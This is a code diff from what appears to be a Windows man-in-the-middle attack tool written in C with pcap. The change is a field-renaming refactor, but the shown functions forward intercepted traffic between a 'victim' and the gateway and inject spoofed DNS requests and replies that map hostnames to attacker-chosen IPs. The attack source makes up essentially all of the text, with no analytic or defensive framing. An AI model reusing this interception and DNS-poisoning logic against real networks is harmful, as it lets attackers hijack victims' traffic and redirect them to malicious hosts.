@@ -48,7 +48,7 @@ DWORD WINAPI ForwardPackets (LPVOID lpParam)
   CopyMemory(&scanParams, tmpParams, sizeof(scanParams));
 
   // Open interface.
-  if ((scanParams.interfaceReadHandle = pcap_open_live((char *) scanParams.interfaceName, 65536, PCAP_OPENFLAG_NOCAPTURE_LOCAL|PCAP_OPENFLAG_MAX_RESPONSIVENESS, PCAP_READTIMEOUT, pcapErrorBuffer)) == NULL)
+  if ((scanParams.InterfaceReadHandle = pcap_open_live((char *) scanParams.InterfaceName, 65536, PCAP_OPENFLAG_NOCAPTURE_LOCAL|PCAP_OPENFLAG_MAX_RESPONSIVENESS, PCAP_READTIMEOUT, pcapErrorBuffer)) == NULL)
   {
     LogMsg(DBG_ERROR, "CaptureIncomingPackets(): Unable to open the adapter");
     retVal = 5;
@@ -56,28 +56,28 @@ DWORD WINAPI ForwardPackets (LPVOID lpParam)
   }
 
   // MAC == LocalMAC and (IP == GWIP or IP == VictimIP
-  scanParams.interfaceWriteHandle = scanParams.interfaceReadHandle;
+  scanParams.InterfaceWriteHandle = scanParams.InterfaceReadHandle;
   ZeroMemory(&ifcCode, sizeof(ifcCode));
   ZeroMemory(filter, sizeof(filter));
 
-  _snprintf(filter, sizeof(filter) - 1, "ip && ether dst %s && not src host %s && not dst host %s", scanParams.localMacStr, scanParams.localIpStr, scanParams.localIpStr);
+  _snprintf(filter, sizeof(filter) - 1, "ip && ether dst %s && not src host %s && not dst host %s", scanParams.LocalMacStr, scanParams.LocalIpStr, scanParams.LocalIpStr);
   netMask = 0xffffff; // "255.255.255.0"
 
-  if (pcap_compile((pcap_t *)scanParams.interfaceWriteHandle, &ifcCode, (const char *) filter, 1, netMask) < 0)
+  if (pcap_compile((pcap_t *)scanParams.InterfaceWriteHandle, &ifcCode, (const char *) filter, 1, netMask) < 0)
   {
     LogMsg(DBG_ERROR, "CaptureIncomingPackets(): Unable to compile the BPF filter \"%s\"", filter);
     retVal = 6;
     goto END;
   }
 
-  if (pcap_setfilter((pcap_t *) scanParams.interfaceWriteHandle, &ifcCode) < 0)
+  if (pcap_setfilter((pcap_t *) scanParams.InterfaceWriteHandle, &ifcCode) < 0)
   {
     LogMsg(DBG_ERROR, "CaptureIncomingPackets(): Unable to set the BPF filter \"%s\"", filter);
     retVal = 7;
     goto END;
   }
 
-  while ((funcRetVal = pcap_next_ex((pcap_t*)scanParams.interfaceWriteHandle, (struct pcap_pkthdr **) &packetHeader, (const u_char **)&packetData)) >= 0)
+  while ((funcRetVal = pcap_next_ex((pcap_t*)scanParams.InterfaceWriteHandle, (struct pcap_pkthdr **) &packetHeader, (const u_char **)&packetData)) >= 0)
   {
     if (funcRetVal == 1)
     {
@@ -134,7 +134,7 @@ void PacketForwarding_handler(u_char *param, const struct pcap_pkthdr *pktHeader
   }
 
   // Destination IP is GW
-  else if (memcmp(&packetInfo.ipHdr->daddr, scanParams->gatewayIpBin, BIN_IP_LEN) == 0)
+  else if (memcmp(&packetInfo.ipHdr->daddr, scanParams->GatewayIpBin, BIN_IP_LEN) == 0)
   {
     ProcessData2GW(&packetInfo, scanParams);
     
@@ -170,15 +170,15 @@ void ProcessData2Internet(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
       (tmpNode = (PHOSTNODE)DnsRequestPoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL)
   {
 printf("DNSPOISONG.ProcessData2Internet(): |%s| -> |%s|\n", tmpNode->sData.HostName, tmpNode->sData.SpoofedIP);
-    DnsRequestSpoofing(packetInfo->pcapData, (pcap_t *)scanParams->interfaceWriteHandle, (char *)tmpNode->sData.SpoofedIP, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp, (char *)tmpNode->sData.HostName);
+    DnsRequestSpoofing(packetInfo->pcapData, (pcap_t *)scanParams->InterfaceWriteHandle, (char *)tmpNode->sData.SpoofedIP, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp, (char *)tmpNode->sData.HostName);
     return;
   }
 
-  CopyMemory(packetInfo->etherHdr->ether_dhost, scanParams->gatewayMacBin, BIN_MAC_LEN);
-  CopyMemory(packetInfo->etherHdr->ether_shost, scanParams->localMacBin, BIN_MAC_LEN);
+  CopyMemory(packetInfo->etherHdr->ether_dhost, scanParams->GatewayMacBin, BIN_MAC_LEN);
+  CopyMemory(packetInfo->etherHdr->ether_shost, scanParams->LocalMacBin, BIN_MAC_LEN);
   LogMsg(DBG_INFO, packetInfo->logMsg, "OUT");
 
-  pcap_sendpacket(((pcap_t *)scanParams->interfaceWriteHandle), packetInfo->pcapData, packetInfo->pcapDataLen);
+  pcap_sendpacket(((pcap_t *)scanParams->InterfaceWriteHandle), packetInfo->pcapData, packetInfo->pcapDataLen);
 }
 
 
@@ -190,7 +190,7 @@ void ProcessData2Victim(PPACKET_INFO packetInfo, PSYSNODE realDstSys, PSCANPARAM
   int spoofedDnsPacketLen = 0;
   
   CopyMemory(packetInfo->etherHdr->ether_dhost, realDstSys->data.sysMacBin, BIN_MAC_LEN);
-  CopyMemory(packetInfo->etherHdr->ether_shost, scanParams->localMacBin, BIN_MAC_LEN);
+  CopyMemory(packetInfo->etherHdr->ether_shost, scanParams->LocalMacBin, BIN_MAC_LEN);
   LogMsg(DBG_INFO, packetInfo->logMsg, "IN");
 
   // DNS RESPONSE SPOOFING
@@ -200,14 +200,14 @@ void ProcessData2Victim(PPACKET_INFO packetInfo, PSYSNODE realDstSys, PSCANPARAM
 printf("DNSPOISONG.ProcessData2Victim():  %s -> %s\n", tmpNode->sData.HostName, tmpNode->sData.SpoofedIP);
     spoofedDnsPacketLen = sizeof(spoofedDnsPacket);
     BuildSpoofedDnsReplyPacket(packetInfo->pcapData, packetInfo->pcapDataLen, tmpNode, spoofedDnsPacket, &spoofedDnsPacketLen);
-    if (pcap_sendpacket((pcap_t *)scanParams->interfaceWriteHandle, (unsigned char *)spoofedDnsPacket, spoofedDnsPacketLen) == 0)
+    if (pcap_sendpacket((pcap_t *)scanParams->InterfaceWriteHandle, (unsigned char *)spoofedDnsPacket, spoofedDnsPacketLen) == 0)
     {
       LogMsg(DBG_INFO, "Response DNS POisoning : %s -> %s", tmpNode->sData.HostName, tmpNode->sData.SpoofedIP);
       return;
     }
   }
 
-  pcap_sendpacket((pcap_t *)scanParams->interfaceWriteHandle, packetInfo->pcapData, packetInfo->pcapDataLen);
+  pcap_sendpacket((pcap_t *)scanParams->InterfaceWriteHandle, packetInfo->pcapData, packetInfo->pcapDataLen);
 }
 
 
@@ -221,14 +221,14 @@ void ProcessData2GW(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
       (tmpNode = (PHOSTNODE)DnsRequestPoisonerGetHost2Spoof((u_char *)packetInfo->pcapData)) != NULL)
   {
 printf("DNSPOISONG.ProcessData2GW(): |%s| -> |%s|\n", tmpNode->sData.HostName, tmpNode->sData.SpoofedIP);
-    DnsRequestSpoofing((unsigned char *)packetInfo->pcapData, (pcap_t *)scanParams->interfaceWriteHandle, (char *)tmpNode->sData.SpoofedIP, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp, (char *)tmpNode->sData.HostName);
+    DnsRequestSpoofing((unsigned char *)packetInfo->pcapData, (pcap_t *)scanParams->InterfaceWriteHandle, (char *)tmpNode->sData.SpoofedIP, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp, (char *)tmpNode->sData.HostName);
     return;
   }
 
-  CopyMemory(packetInfo->etherHdr->ether_dhost, scanParams->gatewayMacBin, BIN_MAC_LEN);
-  CopyMemory(packetInfo->etherHdr->ether_shost, scanParams->localMacBin, BIN_MAC_LEN);
+  CopyMemory(packetInfo->etherHdr->ether_dhost, scanParams->GatewayMacBin, BIN_MAC_LEN);
+  CopyMemory(packetInfo->etherHdr->ether_shost, scanParams->LocalMacBin, BIN_MAC_LEN);
   LogMsg(DBG_INFO, packetInfo->logMsg, "GW");
-  pcap_sendpacket(((pcap_t *)scanParams->interfaceWriteHandle), packetInfo->pcapData, packetInfo->pcapDataLen);
+  pcap_sendpacket(((pcap_t *)scanParams->InterfaceWriteHandle), packetInfo->pcapData, packetInfo->pcapDataLen);
 }
 
 
